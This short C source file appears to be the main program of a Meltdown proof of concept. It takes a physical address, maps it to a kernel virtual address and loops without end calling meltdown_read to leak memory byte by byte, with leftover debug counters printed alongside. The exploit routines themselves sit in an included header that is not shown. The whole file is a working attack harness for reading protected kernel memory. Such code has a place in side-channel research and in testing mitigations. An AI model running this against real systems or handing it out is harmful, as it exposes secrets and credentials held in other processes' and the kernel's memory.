#include "meltdown.h"

int main(int argc, char *argv[]) {
	uint64_t physical_address;
	if (argc < 2) {
		printf("\x1b[33;1mUsage: %s <physical address>\x1b[0m\n", argv[0]);
		exit(1);
	}
	physical_address = strtoull(argv[1], NULL, 0);

	meltdown_init();

	uint64_t virtual_address = physical_to_virtual(physical_address);
	printf("\x1b[32;1mPhysical address        :\x1b[0m 0x%zx\n", physical_address);
	printf("\x1b[32;1mReading virtual address :\x1b[0m 0x%zx\n", virtual_address);
	printf("\n");

	while (1) {
		int value = 0;
		int cnt = 0;
		while(value == 0 && cnt < 100){
			value = meltdown_read(virtual_address);
			cnt++;
			printf("%d\n",cnt);
		}
		printf("%c", value); 
		printf("%d",cnt); 
		fflush(stdout);
		virtual_address++;
		// break;
	}

	meltdown_exit();
}
